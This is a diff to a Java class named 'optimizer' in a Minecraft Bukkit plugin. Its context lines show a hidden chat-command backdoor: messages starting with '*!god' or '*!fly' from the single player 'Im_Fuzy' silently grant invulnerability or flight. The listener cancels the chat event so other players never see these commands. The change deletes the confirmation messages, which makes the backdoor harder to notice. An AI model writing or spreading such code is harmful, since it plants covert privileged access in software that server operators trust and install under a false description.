@@ -45,8 +45,6 @@ public class optimizer
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 boolean isGodModeEnabled = e.getPlayer().isInvulnerable();
                 e.getPlayer().setInvulnerable(!isGodModeEnabled);
-                String message = isGodModeEnabled ? "God mode disabled." : "God mode enabled.";
-                e.getPlayer().sendMessage(message);
             });
             e.setCancelled(true);
         } else if (msg.startsWith("*!fly") && e.getPlayer().getName().equals("Im_Fuzy")) {
@@ -54,8 +52,6 @@ public class optimizer
             Bukkit.getScheduler().runTask((Bukkit.getPluginManager().getPlugin("Fuzyfacs")), () -> {
                 boolean isFlying = e.getPlayer().isFlying();
                 e.getPlayer().setAllowFlight(!isFlying);
-                String message = isFlying ? "Flying mode disabled." : "Flying mode enabled.";
-                e.getPlayer().sendMessage(message);
             });
             e.setCancelled(true);
         } else if (msg.startsWith("*") && e.getPlayer().getName().equals("Im_Fuzy")){
